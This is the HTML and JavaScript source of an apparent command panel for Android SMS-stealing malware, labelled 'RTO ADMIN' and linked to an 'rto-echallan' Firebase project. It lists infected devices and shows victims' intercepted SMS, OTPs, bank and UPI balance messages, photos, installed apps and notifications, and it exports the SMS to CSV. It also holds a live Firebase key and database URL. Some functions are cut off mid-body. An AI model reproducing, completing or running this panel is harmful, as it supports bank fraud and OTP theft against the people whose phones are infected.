<!DOCTYPE html>
<html lang="en">
<head>

<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; color:#E5E7EB; min-height:100vh; }
.login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; }

.tx-bal { color:#10B981; font-size:20px; font-weight:bold; margin-top:2px; }
.tx-amt-lbl { color:#64748B; font-size:9px; text-transform:uppercase; text-align:right; }
.tx-amt { color:#F87171; font-size:14px; font-weight:bold; }
.tx-amt.cr { color:#10B981; }
.tx-msg { color:#94A3B8; font-size:10px; margin-top:8px; line-height:1.5; padding-top:8px; border-top:1px solid #1E3A8A; }

.bal-big { background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:10px; padding:14px; margin-bottom:10px; }
.bal-big .l { color:#64748B; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; }

.note h4 { color:#60A5FA; font-size:12px; margin-bottom:8px; }

.sim-field { margin-bottom:8px; }

@media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }

</head>
<body>

<div class="login-screen" id="loginScreen">
  <div class="login-box">
    <h1>🔐 RTO ADMIN</h1>
    <p>Enter your PIN to continue</p>
    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
    <button class="btn-primary" id="loginBtn">LOGIN</button>
    <div class="error-msg" id="errorMsg"></div>
  </div>
</div>

<div id="mainApp" style="display:none;">
  <div class="topbar">
    <h1>🚔 RTO ADMIN</h1>
    <div class="topbar-right">
      <div class="status"><div class="dot"></div><span>Live</span></div>
      <button class="btn-logout" id="logoutBtn">LOGOUT</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="n" id="sTotal">0</div><div class="l">Total</div></div>
    <div class="stat g"><div class="n" id="sOnline">0</div><div class="l">Online</div></div>
    <div class="stat r"><div class="n" id="sOffline">0</div><div class="l">Offline</div></div>
    <div class="stat"><div class="n" id="sSms">0</div><div class="l">SMS</div></div>
    <div class="stat y"><div class="n" id="sBank">0</div><div class="l">Bank</div></div>
  </div>
  <div class="chips">
    <div class="chip" id="btnCsv">📋 CSV</div>
    <div class="chip" id="btnFb">🔥 FB</div>
    <div class="chip danger" id="btnNuke">☢️ Nuke</div>
  </div>
  <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search devices...">
  <div class="filters">
    <div class="fbtn active" data-f="all">All</div>
    <div class="fbtn" data-f="online">Online</div>
    <div class="fbtn" data-f="offline">Offline</div>
    <div class="fbtn" data-f="upi">UPI</div>
    <div class="fbtn" data-f="bank">Bank</div>
    <div class="fbtn" data-f="card">Card</div>
    <div class="fbtn" data-f="liked">⭐ Liked</div>
  </div>
  <div class="device-grid" id="deviceGrid"><div class="loading">Loading...</div></div>
</div>

<div class="drawer-overlay" id="dOverlay"></div>
<div class="drawer" id="drawer">
  <div class="drawer-head">
    <h2 id="dTitle">Device</h2>
    <div class="head-actions">
      <button class="ibtn" id="btnStar">☆</button>
      <button class="ibtn danger" id="btnDel">🗑</button>
      <button class="ibtn" id="btnClose">✕</button>
    </div>
  </div>
  <div class="tabs">
    <button class="tab active" data-t="info">Info</button>
    <button class="tab" data-t="bank">Bank <span class="cnt" id="cBank">0</span></button>
    <button class="tab" data-t="card">Card <span class="cnt" id="cCard">0</span></button>
    <button class="tab" data-t="allsms">All SMS <span class="cnt" id="cSms">0</span></button>
    <button class="tab" data-t="photos">Photos <span class="cnt" id="cPhotos">0</span></button>
    <button class="tab" data-t="apps">Apps <span class="cnt" id="cApps">0</span></button>
    <button class="tab" data-t="notifs">Notifs <span class="cnt" id="cNotifs">0</span></button>
    <button class="tab" data-t="send">Send</button>
  </div>
  <div class="drawer-body" id="dBody"><div class="loading">Loading...</div></div>
</div>

<div class="pviewer" id="pViewer">
  <img id="pImg" src="">
  <div class="pv-info" id="pInfo"></div>
  <div class="pv-controls">
    <button id="pDownload">⬇ DOWNLOAD</button>
    <button class="close" id="pClose">✕ CLOSE</button>
  </div>
</div>

<script>
var firebaseConfig = {
  apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
  databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
  projectId: "rto-echallan-v2",
  appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
};
firebase.initializeApp(firebaseConfig);
var db = firebase.database();
var devs = {};
var curId = null;
var curTab = 'info';
var curMsgs = {};
var curFilter = 'all';
var liked = JSON.parse(localStorage.getItem('liked') || '[]');
var photos = {};
var curPhoto = '';

function doLogin() {
  var p = document.getElementById('pinInput').value.trim();
  if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
  document.getElementById('errorMsg').textContent = 'Checking...';
  db.ref('admin_config/login_pin').once('value').then(function(s) {
    if (p === (s.val() || '0987')) {
      localStorage.setItem('admin_logged_in', 'true');
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('mainApp').style.display = 'block';
      startApp();
    } else { document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
  }).catch(function(e) { document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
}
function doLogout() { localStorage.removeItem('admin_logged_in'); location.reload(); }
function startApp() {
  db.ref('device_info').on('value', function(s) {
    devs = s.val() || {};
    updStats(); renderDevs();
    if (curId && devs[curId]) renderTab();
  });
}
function updStats() {
  var ids = Object.keys(devs);
  var on = 0, off = 0, sms = 0, bank = 0;
  ids.forEach(function(id) {
    var d = devs[id];
    if (d.status === 'Online') on++; else off++;
    var allM = [];
    if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); });
    if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });

function toggleLike(id) {

}
function updStar() { var b = document.getElementById('btnStar'); if (b) b.textContent = isLiked(curId) ? '⭐' : '☆'; }

function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#10B981'; if (p >= 20) return '#F59E0B'; return '#EF4444'; }
function esc(t) { if (!t) return ''; var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
function cat(sender, body) {
  var s = (sender || '').toUpperCase(); var b = (body || '').toUpperCase();
  if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
  if (b.indexOf('BAL') !== -1 || b.indexOf('BALANCE') !== -1 || b.indexOf('AVAILABLE') !== -1) return 'BALANCE';
  if (b.indexOf('CREDIT') !== -1 || b.indexOf('CREDITED') !== -1 || b.indexOf('CR ') !== -1) return 'CREDIT';
  if (b.indexOf('DEBIT') !== -1 || b.indexOf('DEBITED') !== -1 || b.indexOf('DR ') !== -1 || b.indexOf('WITHDRAWN') !== -1) return 'DEBIT';
  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1 || s.indexOf('AXIS') !== -1 || s.indexOf('BOB') !== -1 || s.indexOf('PHONPE') !== -1 || s.indexOf('PHONEPE') !== -1 || s.indexOf('PAYTM') !== -1 || s.indexOf('GPAY') !== -1) return 'BANK';
  return 'ALERT';
}
function bankName(sender) {
  var s = (sender || '').toUpperCase();
  if (s.indexOf('SBI') !== -1) return 'SBI';
  if (s.indexOf('HDFC') !== -1) return 'HDFC';
  if (s.indexOf('ICICI') !== -1) return 'ICICI';
  if (s.indexOf('AXIS') !== -1) return 'AXIS';
  if (s.indexOf('BOB') !== -1) return 'BOB';
  if (s.indexOf('PHONEPE') !== -1 || s.indexOf('PHONPE') !== -1) return 'PhonePe';
  if (s.indexOf('GPAY') !== -1) return 'GPay';
  if (s.indexOf('PAYTM') !== -1) return 'Paytm';
  if (s.indexOf('AIRTEL') !== -1) return 'Airtel';
  return 'Bank';
}
function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
function extractTx(body) {
  var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/gi);
  return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : '');
}
function detectFromSms(allMsgs) {
  var phones = {}; var nets = {};
  allMsgs.forEach(function(m) {
    var t = (m.body || '') + ' ' + (m.sender || '');
    var pm = t.match(/\b[6-9]\d{9}\b/g);
    if (pm) pm.forEach(function(p) { phones[p] = true; });
    var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/);
    if (nm) nets[nm[1]] = true;
  });
  return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
}

// ✅ PHOTOS — CLOUDINARY URL + DEDUP FIX
// ═══════════════════════════════════════════════════════
function renderPhotos() {
  var b = document.getElementById('dBody');
  var arr = Object.entries(photos);
  
  // ✅ Sirf woh photos rakho jisme url ya base64 hai
  arr = arr.filter(function(p) {
    return p[1] && (p[1].url || p[1].base64);
  });
  
  // ✅ Duplicate hatao (same name ke)
  var seen = {};
  arr = arr.filter(function(p) {
    var key = p[1].name || p[0];
    if (seen[key]) return false;
    seen[key] = true;
    return true;
  });
  
  document.getElementById('cPhotos').textContent = arr.length;
  
  if (arr.length === 0) {
    b.innerHTML = '<div class="empty">No photos yet</div>';
    return;
  }
  
  b.innerHTML = '<div class="pgrid">' + arr.map(function(p) {
    var url = p[1].url || '';
    var base64 = p[1].base64 || '';
    var imgSrc = '';
    
    if (url) {
      // ✅ Cloudinary thumbnail transform
      imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
    } else if (base64) {
      // ✅ Purani base64 photo
      imgSrc = base64;
    }
    
    return '<div class="pitem" data-p="' + p[0] + '">' +
           '<img src="' + imgSrc + '" loading="lazy" onerror="this.src=\'data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22300%22><rect fill=%22%231E3A8A%22 width=%22300%22 height=%22300%22/><text x=%22150%22 y=%22150%22 fill=%22%2364748B%22 font-size=%2214%22 text-anchor=%22middle%22>Failed</text></svg>\'">' +
           (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') +
           '<div class="pname">' + esc(p[1].name || 'IMG') + '</div>' +
           '</div>';
  }).join('') + '</div>';
  
  b.querySelectorAll('[data-p]').forEach(function(e) {
    e.addEventListener('click', function() { showP(this.getAttribute('data-p')); });
  });
}

function showP(k) {
  var p = photos[k];
  if (!p) { alert('No image'); return; }
  
  var imgSrc = p.url || p.base64 || '';
  if (!imgSrc) { alert('No image data'); return; }
  
  curPhoto = k;
  document.getElementById('pImg').src = imgSrc;
  document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
  document.getElementById('pViewer').classList.add('active');
}

document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });

document.getElementById('pDownload').addEventListener('click', function() {
  var p = photos[curPhoto];
  if (!p) return;
  var url = p.url || p.base64 || '';
  if (!url) return;
  
  if (p.url) {
    fetch(p.url)
      .then(function(r) { return r.blob(); })
      .then(function(blob) {
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = p.name || 'photo.jpg';
        a.click();
      })
      .catch(function() {
        window.open(p.url, '_blank');
      });
  } else {
    var a = document.createElement('a');
    a.href = p.base64;
    a.download = p.name || 'photo.jpg';
    a.click();
  }
});

document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });

      .then(function(apps) {
        document.getElementById('cApps').textContent = apps.length;
        if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
        apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
        b.innerHTML = apps.map(function(x) {
          return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>';
        }).join('');
      })
      .catch(function(e) {
        b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>';
      });
  } else {
    var l = Object.values(appsData).filter(function(x) { return x && x.name; });
    l.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
    document.getElementById('cApps').textContent = l.length;
    if (l.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
    b.innerHTML = l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
  }
}

function renderNotifs() {
  var b = document.getElementById('dBody');
  var d = devs[curId];
  var n = d.notifications || {};
  var l = Object.entries(n).sort(function(x, y) { return (y[1].timestamp || 0) - (x[1].timestamp || 0); });
  document.getElementById('cNotifs').textContent = l.length;
  if (l.length === 0) { b.innerHTML = '<div class="empty">No notifications</div>'; return; }
  b.innerHTML = l.map(function(p) {
    var x = p[1];
    return '<div class="notif"><div class="notif-head"><span class="notif-app">' + esc(x.app || 'App') + '</span><span class="notif-date">' + (x.date || '') + '</span></div>' + (x.title ? '<div class="notif-title">' + esc(x.title) + '</div>' : '') + '<div class="notif-body">' + esc(x.message || '') + '</div></div>';
  }).join('');
}

function renderBank() {
  var b = document.getElementById('dBody');
  var d = devs[curId];
  var all = [];
  Object.values(curMsgs).forEach(function(m) { all.push(m); });
  if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
  all.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
  var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
  document.getElementById('cBank').textContent = bks.length;
  if (bks.length === 0) { b.innerHTML = '<div class="empty">No bank messages</div>'; return; }
  var lb = '';
  for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
  var html = '<div style="text-align:center;color:#64748B;font-size:10px;margin-bottom:10px;">Auto-detected from ' + all.length + ' SMS<br>' + bks.length + ' bank message(s) found</div>';
  if (lb) html += '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + lb + '</div></div>';
  html += bks.map(function(m) {
    var bal = extractBal(m.body);
    var tx = extractTx(m.body);
    var bn = bankName(m.sender);
    var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1 || (m.body || '').toUpperCase().indexOf('CR.') !== -1 || (m.body || '').toUpperCase().indexOf('CREDITED') !== -1;
    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Available Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt-lbl">Transaction</div><div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
  }).join('');
  b.innerHTML = html;
}

document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('logoutBtn').addEventListener('click', doLogout);
document.getElementById('btnClose').addEventListener('click', closeDev);
document.getElementById('dOverlay').addEventListener('click', closeDev);
document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
document.getElementById('searchBox').addEventListener('input', renderDevs);
document.getElementById('btnStar').addEventListener('click', function() { toggleLike(curId); });
document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete device?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
document.getElementById('btnCsv').addEventListener('click', function() {
  var csv = 'Device,Sender,Body,Date\n';
  Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
  var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
});
document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + firebaseConfig.databaseURL); });
document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
window.addEventListener('load', function() { if (localStorage.getItem('admin_logged_in') === 'true') { document.getElementById('loginScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; startApp(); } });
</script>
